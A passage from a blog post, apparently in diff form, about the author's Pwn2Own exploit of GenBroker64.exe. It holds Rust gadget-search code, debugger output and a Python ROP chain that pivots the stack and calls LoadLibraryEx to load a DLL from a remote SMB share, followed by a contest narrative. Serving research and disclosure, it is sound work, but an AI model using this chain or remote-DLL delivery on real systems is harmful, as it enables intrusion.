+<span class="w">    </span><span class="k">fn</span> <span class="nf">pre</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">emu</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="n">Emu</span><span class="p">,</span><span class="w"> </span><span class="n">candidate</span>: <span class="kt">u64</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="c1">// ...</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">fn</span> <span class="nf">post</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">emu</span>: <span class="kp">&amp;</span><span class="nc">Emu</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// What we want here, is to find sequence of instructions that leads to @rip</span>
+<span class="w">        </span><span class="c1">// being controlled. To do that, in the |Pre| callback we populate the buffer</span>
+<span class="w">        </span><span class="c1">// we control with the `MARKER_PAGE_ADDR` which is basically a magic address</span>
+<span class="w">        </span><span class="c1">// that&#39;ll trigger a fault if it&#39;s access / written to / executed. Basically,</span>
+<span class="w">        </span><span class="c1">// we want to force a crash as this might mean that we successfully found a</span>
+<span class="w">        </span><span class="c1">// gadget that&#39;ll allow us to turn the constrained arbritrary call from above,</span>
+<span class="w">        </span><span class="c1">// to an uncontrolled where we don&#39;t need to worry about dereferences (cf |mov</span>
+<span class="w">        </span><span class="c1">// rax, qword ptr [rax+10h]|).</span>
+<span class="w">        </span><span class="c1">//</span>
+<span class="w">        </span><span class="c1">// Here is the gadget I ended up using:</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="c1">// 0:011&gt; u poi(1400aed18)</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137ffe0   sub     rsp,38h</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137ffe4   test    rcx,rcx</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137ffe7   je      00007ffb`21380015</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137ffe9   cmp     qword ptr [rcx+10h],0</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137ffee   jne     00007ffb`2137fff4</span>
+<span class="w">        </span><span class="c1">// ...</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137fff4   and     qword ptr [rsp+40h],0</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137fffa   mov     rax,qword ptr [rcx+10h]</span>
+<span class="w">        </span><span class="c1">// 00007ffb2137fffe   call    qword ptr [mfc140u!__guard_dispatch_icall_fptr (00007ffb`21415b60)]</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xffffffff_ffff0000</span><span class="k">u64</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">marker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MARKER_PAGE_ADDR</span><span class="p">.</span><span class="kt">u64</span><span class="p">();</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">rip_has_marker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">emu</span><span class="p">.</span><span class="n">rip</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">marker</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">rip_has_marker</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>I went for lunch to take a break and let the bruteforce run while I was out. I came back and started to see interesting results 😮:</p>
+<p><center><img src="/images/paracosme/bf.png" /></center></p>
+<p>The reality is that the first time I did that I ended up with much more results and I had to tighten the post conditions to get rid of what I clearly didn't care about. But I eventually found glorious <code>0x1400aed08</code>. So let's try to run through manually what happens if we were to inject <code>0x1400aed08</code> as the first QWORD in the reclaimed chunk. As a reminder, here is the few assembly lines that we need to go through when hijacking control flow:</p>
+<div class="highlight"><pre><span></span><code>00007ffb`0df751cb  mov     rax,qword ptr [rcx]
+00007ffb`0df751ce  mov     rax,qword ptr [rax+10h]
+00007ffb`0df751d2  call    qword ptr [00007ffb`0df82660] ; points to jmp @rax
+</code></pre></div>
+
+
+<p>Okay, so first instruction reads the first QWORD in the heap chunk, which is <code>0x1400aed08</code>. Second instructions reads the QWORD at <code>0x1400aed08+0x10</code> which points to a function in <code>mfc140u</code>:</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; dqs 0x1400aed08+10
+00000001`400aed18  00007ffb`2137ffe0 mfc140u!CRuntimeClass::CreateObject [D:\a01\_work\6\s\src\vctools\VC7Libs\Ship\ATLMFC\Src\MFC\objcore.cpp @ 127]
+</code></pre></div>
+
+
+<p>Then, execution is transfered to <code>00007ffb2137ffe0 / mfc140u!CRuntimeClass::CreateObject</code> which does the following:</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; u 00007ffb2137ffe0
+00007ffb2137ffe0   sub     rsp,38h
+00007ffb2137ffe4   test    rcx,rcx
+00007ffb2137ffe7   je      00007ffb`21380015     ; @rcx is never going to be zero, so we won&#39;t take this jump
+00007ffb2137ffe9   cmp     qword ptr [rcx+10h],0 ; @rcx+0x10 is populated with data from our future ROP chain
+00007ffb2137ffee   jne     00007ffb`2137fff4     ; so it will never be zero meaning we&#39;ll take this jump always
+...
+00007ffb2137fff4   and     qword ptr [rsp+40h],0
+00007ffb2137fffa   mov     rax,qword ptr [rcx+10h]
+00007ffb2137fffe   call    qword ptr [mfc140u!__guard_dispatch_icall_fptr (00007ffb`21415b60)]
+
+0:011&gt; u poi(00007ffb`21415b60)
+mfc140u!_guard_dispatch_icall_nop [D:\a01\_work\6\s\src\vctools\crt\vcstartup\src\misc\amd64\guard_dispatch.asm @ 53]:
+00007ffb`21407190 ffe0            jmp     rax
+</code></pre></div>
+
+
+<p>Okay so this is .. amazing ✊🏽. The gadget reads at offset <code>0x10</code> in our chunk and that value as a function address. This means that if we set the first pointer as <code>0x1400aed08</code> and <code>0xdeadbeefbaadc0de</code> at offset <code>0x10</code> then execution will be redirect to <code>0xdeadbeefbaadc0de</code>. We basically boosted our constrained call primitive, to an unconstrained call primitive. This is some solid progress and it recharged a bit my morale. This is already burning 3 slots off the ~18 slots available.</p>
+<p>Now that we have an arbitrary call primitive, we need to kick start a ROP chain. The easiest way to do that usually is to pivot the stack to an area that we control. We can then return to gadgets that simply returns to link execution between gadgets and keep control of it. Unfortunately, finding this gadget also felt pretty annoying. <code>GenBroker64.exe</code> isn't a big module and as a result didn't offer a whole lot of super useful gadget, I was facing another wall. Because I had success with finding a magic gadget automatically, I decided to give it another shot for finding the pivot gadget. Pretty similar than above, in my pre condition I inject the candidate address at the offset <code>0x10</code> of our chunk and looked for a stack that pivoted inside the heap chunk we have control over AND a tainted RIP:</p>
+<div class="highlight"><pre><span></span><code><span class="k">impl</span><span class="w"> </span><span class="n">Finder</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Pwn2OwnMiami2022_2</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">fn</span> <span class="nf">pre</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">emu</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="n">Emu</span><span class="p">,</span><span class="w"> </span><span class="n">candidate</span>: <span class="kt">u64</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// Here, we continue where we left off after the gadget found in |miami1|,</span>
+<span class="w">        </span><span class="c1">// where we went from constrained arbitrary call, to unconstrained arbitrary</span>
+<span class="w">        </span><span class="c1">// call. At this point, we want to pivot the stack to our heap chunk.</span>
+<span class="w">        </span><span class="c1">//</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="c1">// (1de8.1f6c): Access violation - code c0000005 (first/second chance not available)</span>
+<span class="w">        </span><span class="c1">// For analysis of this file, run !analyze -v</span>
+<span class="w">        </span><span class="c1">// mfc140u!_guard_dispatch_icall_nop:</span>
+<span class="w">        </span><span class="c1">// 00007ffd`57427190 ffe0            jmp     rax {deadbeef`baadc0de}</span>
+<span class="w">        </span><span class="c1">//</span>
+<span class="w">        </span><span class="c1">// 0:011&gt; dqs @rcx</span>
+<span class="w">        </span><span class="c1">// 00000000`1970bf00  00000001`400aed08 GenBroker64+0xaed08</span>
+<span class="w">        </span><span class="c1">// 00000000`1970bf08  bbbbbbbb`bbbbbbbb</span>
+<span class="w">        </span><span class="c1">// 00000000`1970bf10  deadbeef`baadc0de &lt;-- this is where @rax comes from</span>
+<span class="w">        </span><span class="c1">// 00000000`1970bf18  61616161`61616161</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="bp">self</span><span class="p">.</span><span class="n">rcx_before</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">emu</span><span class="p">.</span><span class="n">rcx</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// Fix-up @rax with the candidate address.</span>
+<span class="w">        </span><span class="n">emu</span><span class="p">.</span><span class="n">set_rax</span><span class="p">(</span><span class="n">candidate</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// Fix-up the buffer, where the address of the candidate would be if we were</span>
+<span class="w">        </span><span class="c1">// executing it after |miami1|.</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">size_of_u64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span>::<span class="n">mem</span>::<span class="n">size_of</span>::<span class="o">&lt;</span><span class="kt">u64</span><span class="o">&gt;</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">second_qword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">size_of_u64</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">        </span><span class="n">emu</span><span class="p">.</span><span class="n">virt_write</span><span class="p">(</span><span class="n">Gva</span>::<span class="n">from</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rcx_before</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">second_qword</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">candidate</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// Overwrite the buffer we control with the `MARKER_PAGE_ADDR`. Skip the first 3</span>
+<span class="w">        </span><span class="c1">// qwords, because the first and third ones are already used to hijack flow</span>
+<span class="w">        </span><span class="c1">// and the second we skip it as it makes things easier.</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">qword_idx</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">3</span><span class="o">..</span><span class="mi">18</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">byte_idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">qword_idx</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">size_of_u64</span><span class="p">;</span>
+<span class="w">            </span><span class="n">emu</span><span class="p">.</span><span class="n">virt_write</span><span class="p">(</span>
+<span class="w">                </span><span class="n">Gva</span>::<span class="n">from</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rcx_before</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">byte_idx</span><span class="p">),</span>
+<span class="w">                </span><span class="o">&amp;</span><span class="n">MARKER_PAGE_ADDR</span><span class="p">.</span><span class="kt">u64</span><span class="p">(),</span>
+<span class="w">            </span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nb">Ok</span><span class="p">(())</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">fn</span> <span class="nf">post</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">emu</span>: <span class="kp">&amp;</span><span class="nc">Emu</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// Let&#39;s check if we pivoted into our buffer AND that we also are able to</span>
+<span class="w">        </span><span class="c1">// start a ROP chain.</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">wanted_landing_start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">rcx_before</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x18</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">wanted_landing_end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">rcx_before</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x90</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">pivoted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">has_stack_pivoted_in_range</span><span class="p">(</span><span class="n">emu</span><span class="p">,</span><span class="w"> </span><span class="n">wanted_landing_start</span><span class="o">..=</span><span class="n">wanted_landing_end</span><span class="p">);</span>
+
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xffffffff_ffff0000</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">rip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">emu</span><span class="p">.</span><span class="n">rip</span><span class="p">();</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">rip_has_marker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">rip</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="n">MARKER_PAGE_ADDR</span><span class="p">.</span><span class="kt">u64</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">);</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">is_interesting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pivoted</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">rip_has_marker</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">is_interesting</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>After running it for a while, <code>0x14005bd25</code> appeared:</p>
+<p><center><img src="/images/paracosme/bf2.png" /></center></p>
+<p>Let's check what happens if we redirect execution to <code>0x14005bd25</code> with the arbitrary call primitive we developped above:</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; u 0x14005bd25 l3
+GenBroker64+0x5bd25:
+00000001`4005bd25 8be1            mov     esp,ecx
+00000001`4005bd27 803d5a2a0a0000  cmp     byte ptr [GenBroker64+0xfe788 (00000001`400fe788)],0
+00000001`4005bd2e 0f8488010000    je      GenBroker64+0x5bebc (00000001`4005bebc)
+
+0:011&gt; db 00000001`400fe788 l1
+00000001`400fe788  00                                               .
+
+0:011&gt; u 00000001`4005bebc l0n11
+GenBroker64+0x5bebc:
+00000001`4005bebc 4c8d5c2460      lea     r11,[rsp+60h]
+00000001`4005bec1 498b5b30        mov     rbx,qword ptr [r11+30h]
+00000001`4005bec5 498b6b38        mov     rbp,qword ptr [r11+38h]
+00000001`4005bec9 498b7340        mov     rsi,qword ptr [r11+40h]
+00000001`4005becd 498be3          mov     rsp,r11
+00000001`4005bed0 415f            pop     r15
+00000001`4005bed2 415e            pop     r14
+00000001`4005bed4 415d            pop     r13
+00000001`4005bed6 415c            pop     r12
+00000001`4005bed8 5f              pop     rdi
+00000001`4005bed9 c3              ret
+</code></pre></div>
+
+
+<p>This one is pretty interesting. The first instruction is the one that effectively pivot the stack to the heap chunk under our control. What is weird is that it uses the 32-bit registers <code>esp</code> &amp; <code>ecx</code> as opposed to <code>rsp</code> &amp; <code>rcx</code>. If either the stack or our heap buffer gets allocated to a location that is above <code>0xffff'ffff</code> then things would go wrong.</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; r @rsp
+rsp=000000001961acd8
+
+0:011&gt; r @rcx
+rcx=000000001970bf00
+</code></pre></div>
+
+
+<p>At first I was very doubtful that this would not happen during normal use; I thought I got lucky when I grabbed the crash-dump and that if I grabbed another one things would be different. I started to test the hypothesis and I never ran into a case where either of those pointers were larger than what a 32-bit registers could hold. It's kind of weird, I am not sure why the kernel seemed to always lay out the stack in the lower part of the virtual address-space, but hey whatever it worked for me 😅</p>
+<p>After pivoting the stack right at the start of the heap chunk, it reads reads three values into <code>@rbx</code>, <code>@rbp</code> &amp; <code>@rsi</code> at different offsets from <code>@r11</code>. <code>@r11</code> is pointing to <code>@rsp+0x60</code> which is at offset <code>0x60</code> from the start of the heap chunk. This is fine because we can control <code>0xc0</code> bytes so the offsets <code>0x90</code> / <code>0x98</code> / <code>0xa0</code> are still in bound which mean we can also control <code>@rbx</code>, <code>@rbp</code> &amp; <code>@rsi</code>. After that, the stack is pivoted again via the <code>mov rsp, r11</code> instructions which moves the stack at the offset <code>0x60</code> into our heap chunk. From there, five pointers are popped off the stack giving us control over <code>@r15</code> / <code>@r14</code> / <code>@r13</code> / <code>@r12</code> / <code>@rdi</code>.</p>
+<p>What's next? 🤔 We did make a bunch of progress but what we've been doing until now is mostly setting things up so that we can actually do useful things. What we need now is to arrange the puzzle pieces to call <code>LoadLibraryEx("\\\\192.168.0.1\\x\\a.dll\x00", 0, 0)</code>. Ok well, we are exploiting a 64-bit process so we need to load <code>@rcx</code> with a pointer to the string. We also need to load <code>@rdx</code> &amp; <code>@r8</code> to zero. To be able to call <code>LoadLibraryEx</code>, we need to dereference the IAT chunk which is at <code>0x1400ae418</code> and redirect execution there:</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; dqs 0x1400ae418 l1
+00000001`400ae418  00007ffd`7028e4f0 kernel32!LoadLibraryWStub
+</code></pre></div>
+
+
+<p>The string can be placed in the heap chunk so we just need to find a way to load its address in <code>@rcx</code>. What's nice is <code>@rcx</code> points to the start of our heap chunk, so we just need to bump <code>@rcx</code> by an offset to make it align. I did this with an <code>add ecx, dword [rbp-0x75]</code> gadget. I load <code>@rbp</code> with an address that points to the value I need to align <code>@ecx</code> with:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Set @rbp to an address that points to the value 0x30. This is used</span>
+<span class="c1"># to adjust the @rcx pointer to the remote dll path from above.</span>
+<span class="c1">#   0x1400022dc: pop rbp ; ret  ;  (717 found)</span>
+<span class="n">pop_rbp_gadget_addr</span> <span class="o">=</span> <span class="mh">0x1400022DC</span>
+<span class="c1">#   &gt; rp-win-x64.exe --file GenBroker64.exe --search-hexa=\x30\x00\x00\x00</span>
+<span class="c1">#   0x1400a2223: 0\x00\x00\x00</span>
+<span class="n">_0x30_ptr_addr</span> <span class="o">=</span> <span class="mh">0x1400A2223</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp_gadget_addr</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_0x30_ptr_addr</span> <span class="o">+</span> <span class="mh">0x75</span><span class="p">)</span>
+<span class="n">left</span> <span class="o">-=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">2</span>
+
+<span class="c1"># Adjust the @rcx pointer to point to the remote dll path using the</span>
+<span class="c1"># 0x30 pointer loaded in @rbp from above.</span>
+<span class="c1">#   0x14000e898: add ecx, dword [rbp-0x75] ; ret  ;  (1 found)</span>
+<span class="n">add_ecx_gadget_addr</span> <span class="o">=</span> <span class="mh">0x14000E898</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_ecx_gadget_addr</span><span class="p">)</span>
+<span class="n">left</span> <span class="o">-=</span> <span class="mi">8</span>
+</code></pre></div>
+
+
+<p>One issue that we haven't mentioned before is that although it is very handy to have <code>@rsp</code> pointing into a heap chunk under our control, it is very dangerous to call <code>LoadLibraryEx</code> in that state. It will corrupt a bunch of memory and that is assuming that it doesn't when trying to access unmapped memory before or at the end of a page of memory. But there's many more issues that could happen like the content of the chunk changing while <code>LoadLibraryEx</code> is operating on it for example, or the memory disappearing. It's bad. Very bad.</p>
+<p>We don't necessarily need to pivot back the stack where it was before, but we need to pivot it into a reasonably large region of memory which content doesn't change at all; or at least not often. After several tests, I landed on the idea of pivoting the stack into <code>GenClient64</code>'s data section:</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; !dh -a genclient64
+SECTION HEADER #3
+   .data name
+    6C80 virtual size
+  12B000 virtual address
+C0000040 flags
+         Read Write
+</code></pre></div>
+
+
+<p>It's not the most elegant, but it works, don't judge 😅 Anyways to pull this off I reused the <code>pop rbp</code> gadget and use a <code>leave; call qword [@r14+0x08]</code> offset to both pivot the stack and redirect execution to <code>LoadLibraryEx</code>. Although it isn't reflected here well, finding this piece was another frustrating job. I was running out of space and had trouble to pivot the stack AND dereference a controlled address and redirect execution there. What is also tricky is that pivoting the stack and invoking the API needs to happen at the same time, because we have no control over <code>GenClient64</code>'s data section; so once we pivot there we lose control of the execution flow, so it needs to be final.</p>
+<p><center><img src="/images/paracosme/paracosme.gif" /></center></p>
+<p>Phew, we did it 😮 Putting this ROP chain together was definitely a struggle and really was nerve wracking. But you know, little by little.</p>
+<p>I also remember first trying to deliver the payload via a WebDav share and not SMB. I can't remember the reason, but what would happen is that the first time the link was fed to <code>LoadLibraryEx</code> it would fail, but the second time the payloa would pop. I remember spending time reverse-engineering <code>mrxdav.sys</code> to understand what was different the first time from the second time the load request was sent but I really can't remember the reason. Yeah, I know super useful 😬.</p>
+<p>A nice property of the vulnerability exploited is the fact that losing the race doesn't lead to a crash. This means we can try as many times as we want.</p>
+<p>After weeks of daily grinding against this target after work, I finally had something that could be demonstrated during the contest. What a crazy ride.</p>
+<h1 id="entering-the-contest">Entering the contest</h1>
+<p>At this point in the journey, it is probably end of November / or mid December 2022. The contest is happening at the end of the January so timeline wise it is looking great. There's time to test extensively the exploit, tweak the exploit to maximize the chances of landing a successful exploit, developing <a href="https://github.com/0vercl0k/paracosme/blob/main/src/payload/payload.cc">a payload</a> for style points at the contest and have some fun. I am feeling good and I am preparing a vacation trip to France to see my family and take a break which was exciting.</p>
+<p>I'm not quite sure exactly when this happens, but because of COVID-19 the contest was pushed back to the 19 / 21 of April 2023 which was a bummer as I had pushed hard to be on time 😩. I was a bit disappointed but it wasn't the worse thing to happen. I could relax a little bit more and just hope this extra time wouldn't allow the vendor to find and fix the vulnerability I was planning on exploiting. This part was a bit nerve wracking as I didn't know any of the vendors; so I wasn't sure if this was something likely to happen or not.</p>
+<p>Testing the exploit wasn't the most fun activity but I was determined to do all the due diligence from my side as I didn't want to miss the opportunity of winning. I knew that the target software would be running in a VMWare virtual machine so I downloaded it and set one up. At the time, it did feel a bit silly as I had done my test in an Hyper-V VM and I didn't expect that the hypervisor being different would change anything. Whatever. I get amazed everyday at how complex and tricky to predict computers are so I carried on with it.</p>
+<p>The VM was ready and I threw the exploit at it, excited as always and... nothing. Uh, that was unexpected but it wasn't 100% reliable to I ran it several more times. But nothing. Wow what the heck? 😬 It felt pretty uncomfortable and my brain started to run far with impostor syndrome. I even asked myself "Did you actually found a real vulnerability?" or "Had you setup the target with a non default configuration?". Looking back on it, I am definitely laughing but oh boy I wasn't laughing at the time.</p>
+<p>I installed my debugging tools inside the target and I threw the exploit on my operating table. I verified that indeed, I was seeing the same memory corruption issue than on my other VM and that my ROP chain was actually getting executed too. What a relief. Maybe I do understand computers a little bit I thought 😳</p>
+<p>After stepping through the ROP chain, it was pretty clear that <code>LoadLibraryEx</code> was getting executed and that it was reaching out to my SMB server but it didn't seem to ask to be served with the DLL I wanted it to load. Googling the error code around, I realized something that I didn't know and that might be a deal breaker. Basically, Windows 10 by default prevents the default SMB client library to connect anonymously to SMB share 😮 Basically, the vector that I was using to deliver the final payload was blocked on the latest version of Windows. Wow, I really didn't see this coming and I felt pretty grateful to set-up a new environment to run into this case.</p>
+<p>What was stressing me out though is that I didn't have another idea to deliver the payload. Because of ASLR and the imports of <code>GenBroker64.exe</code> I didn't really see other quick ways. I had potential ideas but they would have required me to be able to store a very large ROP chain. But I didn't have that space. What was bizarre though was the fact that my other VM was also Windows 10 and it was working fine. It could have been possible that it wasn't quite the latest Windows 10 or that somehow I had turned it back on while installing some tool or something.</p>
+<p>I eventually landed on this page I believe: <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default">Guest access in SMB2 and SMB3 disabled by default in Windows</a> which offered an explanation that could make sense. According to this page, Windows 10 Enterprise edition disable it by default, but Windows 10 Pro edition doesn't. This exactly matched the two envronements I had set-up so everything would be back working if I installed a Windows 10 Pro edition..? I reimaged my VM with a Professional version and this time the exploit worked as expected, phew 😅 I dodged a big bullet on this one. I really didn't want to throw away the ROP chain to try to find and assemble new puzzle pieces.</p>
+<p>I was finally.... ready. I was extremely nervous but also super excited. I worked hard on that project and it was time to collect some dividends and have some fun.</p>
+<p>I didn't want to burn too many vacation days, so I caught a red-eye flight from Seattle to Miami International Airport on the first day of the competition.</p>
+<p><center><img src="/images/paracosme/flight.png" /></center></p>
+<p>I grabbed a taxi from the airport and headed to my hotel in Miami Beach close from the event venue. I watched the draw online and I was scheduled to go on the first day of the contest, on April 14th at 2pm local time. I worked the morning and took my afternoon off to be able to head to the contest.</p>
+<p>I showed up at the conference venue, but I didn't really see any Pwn2Own posters or anything. On top of that, there were security guards checking for badges on the attendees so I couldn't get in. I looked around the building for maybe another entrance, checked my phone to see if I had missed something but nothing. I went back to the main entrance to ask the security guards if they knew where Pwn2Own was going on? This was pretty hilarious because they didn't have a single clue what it was. I asked "Do you know where the Pwn2Own competition is happening?", the guy answered "Let me ask my colleguage" and the guy start talking to his buddy through the ear piece. "Yo mich, do you know anything about a ... own to pown, or a own to own competition..?". Boy I was standing there, laughing hard inside 😂. After a few exchange, they decided to grab somebody from the organization and that person let me in and made me a badge: Pwn 2 Pown. </p>
+<p>; pic badge ;</p>
+<p>I entered the competition area which was a medium sized room with a few tables, the stage and people hanging out. It was reasonably dark and the light gave it a nice hacker ambiance. I hanged out in the room observing what were people up to. Journalists coming in and out, competitors discussing the schedule, etc. </p>
+<p>The clock was ticking and my turn was coming up pretty fast. I was actually starting to get worried that I wouldn't have time to set up and verify the configuration of the official target. I tried to make my presence known to the organizers but I don't think they know. At about 15min before my turn, one of the organizer found me and we went on the stage for setting up. I pulled out my laptop, plugged an ethernet cable that was connecting me to the target laptop and configured a static IP on my network interface. I chose the same IP than I used during my testing to make sure I don't run into the troubles of having a larger IP address which would require a bigger string and potentially run out of space on my ROP chain. I started pinging the target IP but it wasn't answering. I started to check if my firewall was on or if I had mistyped something.. but nothing worked. At this point we decided to switch the ethernet cable as maybe it was the problem. The clock is ticking and we are about 5 min away from show time. I started getting nervous as I wanted to verify a few things on the target laptop to make sure it was properly configured. I started running through those points while somebody was getting a new ethernet cable. I checked the version of the remote software, the IP of the target, that the <code>GenBroker64.exe</code> used was an x64 binary. One of the organizer handed me a cable, so I hooked it up. The Pwn2Own host starts to go live and I can hear that he's introducing my entry. After a few seconds he comes over and asks if we're ready and I say yes nerviously when in fact I wasn't ready 🤣. I had two min left to verify connectivity with the target and make sure the target could browse an SMB share I opened; just to make sure there wasn't anything funky going on. I just finished it, and we went live.</p>
+<p>I had a hard time typing the command line to invoke my exploit and was worried I would mistype the IP address or something silly like that. I pressed enter and I saw calc and the background wallpaper of the target changed a few seconds after I pressed enter. I was stunned. To be honest, I am still stunned that the exploit landed. I just couldn't believe it. People clapped, I closed down my laptop, standed up feeling the adrenaline rush through my legs.</p>
